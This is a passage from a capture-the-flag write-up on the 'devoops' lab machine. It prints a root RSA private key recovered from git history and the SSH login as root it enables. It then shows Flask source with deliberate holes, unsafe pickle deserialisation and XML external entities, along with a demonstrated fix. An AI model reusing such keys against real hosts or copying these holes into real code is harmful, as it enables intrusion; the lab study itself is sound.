+-S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
+-md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
+-LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
+-oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
+-LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=</span></mark></span><span class="SemanticString"><span>
++MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
++ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
++23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE
++sQ26ynmLutnd/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s
++ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16
++ZBlx4UG0bdxtoE8DLjfoJuWGfCF/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h
++LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO
++JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/2KppubiHDi9
++oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM
++xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw
++vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+0nbfjYX8x
++6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+
++OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE
++4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0
++937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94
++SQMoKu++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT
++Nszh8L9BDEc/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4
++eGDe3y/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd
++i/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP
++6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
++8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV
++RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
++qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
++T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
++bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
+ -----END RSA PRIVATE KEY-----
+-</span></span></span></code></pre><div id="https://www.notion.so/d7ee8949fafd46389347106b94031d8f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Here I retrieved the key that was initially committed in. After removing all the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-</code></span><span class="SemanticString"> characters and saving it on my host, I can use it to SSH in as root:</span></span></p></div><pre id="https://www.notion.so/ec1a27deb30447e7b795847ad2a06475" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/devoops]
+└─$</span></mark></span><span class="SemanticString"><span> chmod 600 root.key
+
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/devoops]
+└─$</span></mark></span><span class="SemanticString"><span> ssh root@10.129.191.193 -i root.key
+
+Warning: Permanently added &#x27;10.129.191.193&#x27; (ED25519) to the list of known hosts.
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+135 packages can be updated.
+60 updates are security updates.
+
+Last login: Fri Sep 23 09:46:30 2022
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@devoops:~#</span></mark></span><span class="SemanticString"><span> id
+
+uid=0(root) gid=0(root) groups=0(root)</span></span></span></code></pre><div id="https://www.notion.so/a5d33a36c140498ead9c22ef72fdfd12" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/26b75ab46a044f378c00aecb64adc154" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Root Flag:</strong></span></span></p></div><pre id="https://www.notion.so/3a4e06fe99ab4f519b029944c9e43494" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@devoops:~#</span></mark></span><span class="SemanticString"><span> cat root.txt
+
+ecd20224************************</span></span></span></code></pre><div id="https://www.notion.so/3a45c0a07e3546ef9132f03db698f5fa" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/4cabfa95e14644aa80382a10071c223c" class="Divider"></div><h3 id="https://www.notion.so/8c7a92544d9f4a3a9e75d9b8cd62b4d6" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/8c7a92544d9f4a3a9e75d9b8cd62b4d6"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">root</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/c3219cdb7d554e4f96c8926e7718719c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Flask Source Code:</strong></span></span></p></div><div id="https://www.notion.so/788b9fe720f948c0b850b420023f3f60" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">With shell access, I can read the source code in full. For some strange reasons, only the bottom half of the file was retrieved via LFI earlier.</span></span></p></div><div id="https://www.notion.so/7240df29190849d283bcc80ff770b7b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/home/roosa/deploy/src/feed.py</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/b8e5aff4e9c54692892466edb4b35382" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment"># -*- coding: utf-8 -*-</span>
+
+<span class="token comment"># TODO: replace manual upload with proper integration to backend</span>
+
+
+<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> send_from_directory
+<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename
+<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>debug <span class="token keyword">import</span> DebuggedApplication
+<span class="token keyword">import</span> re
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> xml<span class="token punctuation">.</span>sax
+<span class="token keyword">import</span> cPickle <span class="token keyword">as</span> pickle
+<span class="token keyword">import</span> base64
+
+<span class="token keyword">class</span> <span class="token class-name">Config</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  UPLOAD_FOLDER<span class="token operator">=</span><span class="token string">'.'</span>
+
+ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>Config<span class="token punctuation">)</span>
+app<span class="token punctuation">.</span>debug<span class="token operator">=</span><span class="token boolean">True</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">)</span>
+
+<span class="token comment">#app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER</span>
+
+<span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token keyword">return</span> <span class="token string">'.'</span> <span class="token keyword">in</span> filename <span class="token keyword">and</span> \
+    filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS
+
+<span class="token keyword">class</span> <span class="token class-name">FeedParse</span><span class="token punctuation">(</span>xml<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>handler<span class="token punctuation">.</span>ContentHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    self<span class="token punctuation">.</span>obj <span class="token operator">=</span> <span class="token builtin">object</span>
+    self<span class="token punctuation">.</span>curpath <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+  
+  <span class="token keyword">def</span> <span class="token function">startElement</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">,</span> attrs<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    self<span class="token punctuation">.</span>chars <span class="token operator">=</span> <span class="token string">""</span>
+    <span class="token keyword">print</span> name<span class="token punctuation">,</span>attrs
+  
+  <span class="token keyword">def</span> <span class="token function">endElement</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> name <span class="token keyword">in</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'Author'</span><span class="token punctuation">,</span><span class="token string">'Subject'</span><span class="token punctuation">,</span><span class="token string">'Content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+      self<span class="token punctuation">.</span>obj<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>chars
+
+  <span class="token keyword">def</span> <span class="token function">characters</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    self<span class="token punctuation">.</span>chars <span class="token operator">+=</span> content
+
+<span class="token keyword">def</span> <span class="token function">process_xml</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
+  parser <span class="token operator">=</span> xml<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>make_parser<span class="token punctuation">(</span><span class="token punctuation">)</span>
+  <span class="token builtin">object</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+  handler <span class="token operator">=</span> FeedParse<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span>
+  parser<span class="token punctuation">.</span>setContentHandler<span class="token punctuation">(</span>handler<span class="token punctuation">)</span>
+  parser<span class="token punctuation">.</span>parse<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token comment">#  print object</span>
+  <span class="token keyword">return</span> <span class="token string">" PROCESSED BLOGPOST: \r\n "</span> <span class="token operator">+</span> \
+         <span class="token string">" Author: "</span> <span class="token operator">+</span> <span class="token builtin">object</span><span class="token punctuation">[</span><span class="token string">"Author"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> \
+         <span class="token string">" Subject: "</span> <span class="token operator">+</span> <span class="token builtin">object</span><span class="token punctuation">[</span><span class="token string">"Subject"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> \
+         <span class="token string">" Content: "</span> <span class="token operator">+</span> <span class="token builtin">object</span><span class="token punctuation">[</span><span class="token string">"Content"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> \
+         <span class="token string">" URL for later reference: "</span> <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'uploaded_file'</span><span class="token punctuation">,</span>filename<span class="token operator">=</span>filename<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> \
+         <span class="token string">" File path: "</span> <span class="token operator">+</span> path
+
+<span class="token keyword">def</span> <span class="token function">template</span><span class="token punctuation">(</span>fname<span class="token punctuation">)</span><span class="token punctuation">:</span>
+  name<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>
+  <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> myfile<span class="token punctuation">:</span>
+    data<span class="token operator">=</span>myfile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+  content<span class="token operator">=</span>re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'\$name'</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+  <span class="token keyword">return</span> content
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">upload_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
+     <span class="token comment"># check if the post request has the file part</span>
+     <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>
+        <span class="token comment">#flash('No file part')</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
+     <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>
+     <span class="token comment"># if user does not select file, browser also</span>
+     <span class="token comment"># submit a empty part without filename</span>
+     <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
+        <span class="token comment">#flash('No selected file')</span>
+        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>
+     <span class="token keyword">if</span> <span class="token builtin">file</span> <span class="token keyword">and</span> allowed_file<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        filename <span class="token operator">=</span> secure_filename<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span>
+        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>Config<span class="token punctuation">.</span>UPLOAD_FOLDER<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> process_xml<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>Config<span class="token punctuation">.</span>UPLOAD_FOLDER<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token comment"># return redirect(url_for('uploaded_file',filename=filename))</span>
+  <span class="token keyword">return</span> template<span class="token punctuation">(</span><span class="token string">'upload.html'</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/uploads/&lt;filename>'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">uploaded_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span>Config<span class="token punctuation">.</span>UPLOAD_FOLDER<span class="token punctuation">,</span>
+                               filename<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">xss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/feed"</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">fakefeed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+   <span class="token keyword">return</span> send_from_directory<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"devsolita-snapshot.png"</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/newpost"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">newpost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+  <span class="token comment"># TODO: proper save to database, this is for testing purposes right now</span>
+  picklestr <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64decode<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span>
+<span class="token comment">#  return picklestr</span>
+  postObj <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>picklestr<span class="token punctuation">)</span>
+  <span class="token keyword">return</span> <span class="token string">"POST RECEIVED: "</span> <span class="token operator">+</span> postObj<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span>
+
+
+<span class="token comment">## TODO: VERY important! DISABLED THIS IN PRODUCTION</span>
+<span class="token comment">#app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')</span>
+<span class="token comment"># TODO: Replace run-gunicorn.sh with real Linux service script</span>
+<span class="token comment"># app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+  app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0,0'</span><span class="token punctuation">,</span> Debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/56c7d3e4d2044ee38e0de01b9530644a" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The function of interest is </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">process_xml()</code></span><span class="SemanticString">, which defines how our uploaded XML files are handled. It uses the </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://docs.python.org/3/library/xml.sax.html">xml.sax</a></span><span class="SemanticString"> module, which, similar to Pickle, also has that big red warning on its official documentation.</span></span></p></div><div id="https://www.notion.so/948c22194c214b85b25ce11f6465d7a3" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F41c0f7ed-8852-4da9-ad1d-5dbb5de9c671%2FUntitled.png?width=835&amp;table=block&amp;id=948c2219-4c21-4b85-b25c-e11f6465d7a3"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F41c0f7ed-8852-4da9-ad1d-5dbb5de9c671%2FUntitled.png?width=835&amp;table=block&amp;id=948c2219-4c21-4b85-b25c-e11f6465d7a3" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/f8be6b0852dd4d5584936ab6fdd3752d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">From version 3.7.1 and onwards, processing of external entities is actually disabled by default. This can also be disabled on older versions, but requires setting it manually via the </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">setFeature()</code></span><span class="SemanticString"> method.</span></span></p></div><div id="https://www.notion.so/3d8f17265e1a4a36ad5ae596504b3232" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As a quick demo, I’ll add a line to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">feed.py</code></span><span class="SemanticString"> to disable external entities:</span></span></p></div><pre id="https://www.notion.so/dae7a29c77894987bd3220e6e365ed11" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">def</span> <span class="token function">process_xml</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
+  parser <span class="token operator">=</span> xml<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>make_parser<span class="token punctuation">(</span><span class="token punctuation">)</span>
+  <span class="token comment"># Disable external entities</span>
+  parser<span class="token punctuation">.</span>setFeature<span class="token punctuation">(</span>xml<span class="token punctuation">.</span>sax<span class="token punctuation">.</span>handler<span class="token punctuation">.</span>feature_external_entities<span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>
+  <span class="token builtin">object</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+  handler <span class="token operator">=</span> FeedParse<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/c30260f4deda4903acd98b473060b1b7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then restarted the Flask server:</span></span></p></div><pre id="https://www.notion.so/f98a2fdef8254bc58e9db3db1b7aa3aa" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>root@devoops:~#</span></mark></span><span class="SemanticString"><span> sudo -u roosa /home/roosa/deploy/run-gunicorn.sh
+
+&lt;Config {&#x27;JSON_AS_ASCII&#x27;: True, &#x27;USE_X_SENDFILE&#x27;: False, &#x27;UPLOAD_FOLDER&#x27;: &#x27;.&#x27;, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_DOMAIN&#x27;: None, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;LOGGER_HANDLER_POLICY&#x27;: &#x27;always&#x27;, &#x27;LOGGER_NAME&#x27;: &#x27;feed&#x27;, &#x27;DEBUG&#x27;: True, &#x27;SECRET_KEY&#x27;: None, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;APPLICATION_ROOT&#x27;: None, &#x27;SERVER_NAME&#x27;: None, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: True, &#x27;TESTING&#x27;: False, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(31), &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: False, &#x27;JSON_SORT_KEYS&#x27;: True, &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(0, 43200), &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False}&gt;
+&lt;Config {&#x27;JSON_AS_ASCII&#x27;: True, &#x27;USE_X_SENDFILE&#x27;: False, &#x27;UPLOAD_FOLDER&#x27;: &#x27;.&#x27;, &#x27;SESSION_COOKIE_PATH&#x27;: None, &#x27;SESSION_COOKIE_DOMAIN&#x27;: None, &#x27;SESSION_COOKIE_NAME&#x27;: &#x27;session&#x27;, &#x27;SESSION_REFRESH_EACH_REQUEST&#x27;: True, &#x27;LOGGER_HANDLER_POLICY&#x27;: &#x27;always&#x27;, &#x27;LOGGER_NAME&#x27;: &#x27;feed&#x27;, &#x27;DEBUG&#x27;: True, &#x27;SECRET_KEY&#x27;: None, &#x27;EXPLAIN_TEMPLATE_LOADING&#x27;: False, &#x27;MAX_CONTENT_LENGTH&#x27;: None, &#x27;APPLICATION_ROOT&#x27;: None, &#x27;SERVER_NAME&#x27;: None, &#x27;PREFERRED_URL_SCHEME&#x27;: &#x27;http&#x27;, &#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;: True, &#x27;TESTING&#x27;: False, &#x27;PERMANENT_SESSION_LIFETIME&#x27;: datetime.timedelta(31), &#x27;PROPAGATE_EXCEPTIONS&#x27;: None, &#x27;TEMPLATES_AUTO_RELOAD&#x27;: None, &#x27;TRAP_BAD_REQUEST_ERRORS&#x27;: False, &#x27;JSON_SORT_KEYS&#x27;: True, &#x27;JSONIFY_MIMETYPE&#x27;: &#x27;application/json&#x27;, &#x27;SESSION_COOKIE_HTTPONLY&#x27;: True, &#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;: datetime.timedelta(0, 43200), &#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;: None, &#x27;SESSION_COOKIE_SECURE&#x27;: False, &#x27;TRAP_HTTP_EXCEPTIONS&#x27;: False}&gt;
